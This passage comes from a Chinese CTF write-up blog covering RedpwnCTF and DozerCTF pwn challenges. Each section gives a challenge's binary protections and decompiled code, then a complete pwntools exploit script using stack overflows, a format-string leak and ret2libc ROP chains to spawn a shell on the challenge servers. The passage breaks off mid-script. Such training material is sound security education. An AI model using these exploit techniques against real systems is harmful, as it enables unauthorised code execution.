skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : coffer-overflow-1.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./coffer-overflow-1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;2020.redpwnc.tf&quot;</span>,<span class="number">31255</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./coffer-overflow-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;with?\n&quot;</span>,payload) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="coffer-overflow-2"><a href="#coffer-overflow-2" class="headerlink" title="coffer-overflow-2"></a>coffer-overflow-2</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-2"><a href="#保护情况-2" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-2"><a href="#漏洞函数-2" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>题目给了程序源代码，但是我们还是按照正常题目做法分析二进制文件。</p><p>漏洞就在 main 中，gets 函数存在栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to coffer overflow, where our coffers are overfilling with bytes ;)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to fill your coffer with?&quot;</span>);</span><br><span class="line">  gets(&amp;v4, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序中存在有后门函数，但不像前两题放在 main 函数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">binFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>程序用 gets 函数存在栈溢出漏洞，也有后门函数，但不像前两题放在 main 函数中。做法就是前两题提到的第二种做法：利用栈溢出修改 rip 的返回地址到后门函数 <code>binFunction()</code> 。</p><p>首先就是确定填充长度，可以从 IDA 变量后面的注释去分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br></pre></td></tr></table></figure><p>填充 0x10 到 rbp ，再填充 0x8 就是到达了 rip 。最终得出我们需要填充 0x18 。</p><p>填充长度确认了，然后就是 rip 的填充内容，程序没有打开 pie 保护，直接从 ida 里面找到 <code>binFunction()</code> 地址：0x04006E6 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(binFunction)</span><br></pre></td></tr></table></figure><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : coffer-overflow-2.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./coffer-overflow-2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;2020.redpwnc.tf&quot;</span>,<span class="number">31908</span>)</span><br><span class="line">elf = process(<span class="string">&quot;./coffer-overflow-2&quot;</span>)</span><br><span class="line"></span><br><span class="line">binFunction = <span class="number">0x04006E6</span></span><br><span class="line">log.info(<span class="string">&quot;binFunction:&quot;</span>+<span class="built_in">hex</span>(binFunction))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(binFunction)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;with?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret-flag"><a href="#secret-flag" class="headerlink" title="secret-flag"></a>secret-flag</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-3"><a href="#保护情况-3" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-3"><a href="#漏洞函数-3" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>main 函数中的 19 行格式化字符串漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// ST08_8</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// ST04_4</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  fd = open(<span class="string">&quot;flag.txt&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  read(fd, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I have a secret flag, which you&#x27;ll never get!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What is your name, young adventurer?&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x14</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello there: &quot;</span>, <span class="number">0x14</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);                                   <span class="comment">// 格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>main 函数开始先申请一个块堆，用 buf 去存储堆指针。然后从 flag.txt 读取 flag 到 buf 指向的堆中。</p><p>19 行存在一个格式化字符串漏洞，这个格式化字符串漏洞， 可以用来读取数据。到这里我们肯定会联想到读取程序中被读入的 flag 。</p><p>正常来说，通常都是通过偏移读取栈上的数据，常用的是用 %p 、%x ……但是这道题目将 flag 存放在堆上，堆指针存放在了栈上。</p><p>这里就需要知道一个技巧了，%p、%x 读取的时候是找到栈上的某一个地址后，将该地址存储的数据当作值输出。而使用 %s 读取时是找到栈上的某一个地址后，将该地址存储的数据当做指针，去找这个指针指向的值。</p><p>结合这条题理解一下，将断点打在 0x9f0 ，打开 PIE 保护程序打断点：<code>gdb.attach(p,&quot;b *$rebase(0x9f0)&quot;)</code>，运行到断点处观察栈结构：</p><p><img src= "/img/loading.gif" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3NreWVkYWk5MTAvUGljYmVkL2ltZy8yMDIwMDYyMzE3MzQxNC5wbmc?x-oss-process=image/format,png"></p><p>内存地址 0x7fffffffdd58 存储值为：0x555555756010；0x555555756010 是堆指针，堆中存储是本地flag：bbbbbbbbccccccccdddddddd\n。</p><p>下面是分别用 %p 和 %s 输出的结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> %p输出结果</span></span><br><span class="line">0x555555756010</span><br><span class="line"><span class="meta">#</span><span class="bash"> %s输出结果</span></span><br><span class="line">bbbbbbbbccccccccdddddddd</span><br></pre></td></tr></table></figure><p>还有一点就是<strong>用 %s 输出数据会一直输出直到遇到 \x00（结束符）为止</strong>。</p><p>确定了泄露 flag 方法了，然后就是需要确定偏移地址了。偏移地址可以用算，也可以输入多个 %p 爆出来，这次我试一下没用过的算出来。</p><p>首先 64 位程序前 6 个参数是寄存器传参，然后 rsp 到格式化字符串距离是 3 ，所以格式化字符串偏移为 5+3 ；堆指针偏移为 5+2 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3NreWVkYWk5MTAvUGljYmVkL2ltZy8yMDIwMDYyMzE3NDYyMS5wbmc?x-oss-process=image/format,png"></p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : secret-flag.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./secret-flag&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;2020.redpwnc.tf&quot;,31826)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./secret-flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + <span class="string">&quot;%7$s&quot;</span><span class="comment">#+ &quot;%8$p&quot;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;adventurer?\n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x9f0)&quot;)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="the-library"><a href="#the-library" class="headerlink" title="the-library"></a>the-library</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-4"><a href="#保护情况-4" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-4"><a href="#漏洞函数-4" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>这里有两个漏洞，都是在 main 中。一个是栈溢出、一个是格式化字符串。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the library... What&#x27;s your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);                      <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello there: &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;buf);                                   <span class="comment">// 格式化字符串</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序没有给后门函数。</p><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>这个程序没有开 canary 直接利用栈溢出做一个 ROP 就行了。填充长度是：0x10+0x8 。先用 puts@plt 输出 puts@got ，然后 ret2text 回到 main 中，再次利用栈溢出修改 rip 执行 <code>system(&#39;/bin/sh&#39;)</code> 。payload 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment"># ret2libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)</span><br></pre></td></tr></table></figure><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : the-library.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./the-library&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;2020.redpwnc.tf&quot;</span>,<span class="number">31350</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./the-library&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x0400637</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">log.success(<span class="string">&quot;starting payload1&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc_base = puts_leak - <span class="number">0x0809c0</span><span class="comment">#libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + <span class="number">0x04f440</span><span class="comment">#libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + <span class="number">0x1b3e9a</span><span class="comment">#libc.search(&#x27;/bin/sh\x00&#x27;).next()</span></span><br><span class="line">log.info(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ret2libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)<span class="comment"># + p64(main_addr)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;name?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> RedpwnCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DozerCTF Writeup</title>
      <link href="archives/143/"/>
      <url>archives/143/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn-ret2-temp"><a href="#pwn-ret2-temp" class="headerlink" title="pwn - ret2 temp"></a>pwn - ret2 temp</h2><blockquote><p>一开始记得不是这个题目名字，应该是 ret2dl-resolve ，高大上东西不会</p></blockquote><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h4><p>32 位动态链接；打开 NX ；</p><pre><code>Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)</code></pre><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>read 函数栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h4 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h4><p>栈溢出，用 write 泄露 libc 地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><h4 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h4><p>到 <a href="https://github.com/niklasb/libc-database">libc-database</a> 查远程的 libc 是：<a href="https://libc.blukat.me/d/libc6-i386_2.23-0ubuntu11_amd64.so">libc6-i386_2.23-0ubuntu11_amd64.so</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;118.31.11.216&quot;</span>,<span class="number">36666</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x0804851f</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;write_plt:&quot;</span>+<span class="built_in">hex</span>(write_plt))</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;write_got:&quot;</span>+<span class="built_in">hex</span>(write_got))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">write_leak = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line"></span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">binsh = libc_base + libc.search(<span 